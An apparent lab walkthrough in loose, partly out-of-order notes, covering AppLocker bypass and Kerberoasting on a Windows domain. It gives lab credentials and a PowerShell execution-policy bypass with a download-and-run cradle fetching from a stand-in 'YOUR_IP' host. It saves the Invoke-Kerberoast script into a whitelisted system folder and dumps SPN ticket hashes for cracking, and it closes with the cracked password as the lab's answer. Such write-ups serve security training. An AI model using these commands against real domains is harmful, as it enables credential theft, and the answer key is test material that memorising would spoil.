## Table of Contents


AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, published, and hash.
Username: corp\dark  
Password: _QuejVudId6
  
Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

Lets first download the Powershell [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1).

powershell -ep bypass;  
iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Kerberoast.ps1')



Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl

You should get a SPN ticket.

```
powershell -c "(new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1', 'C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1')"
```

Crack the hash. What is the users password in plain text?
rubenF124

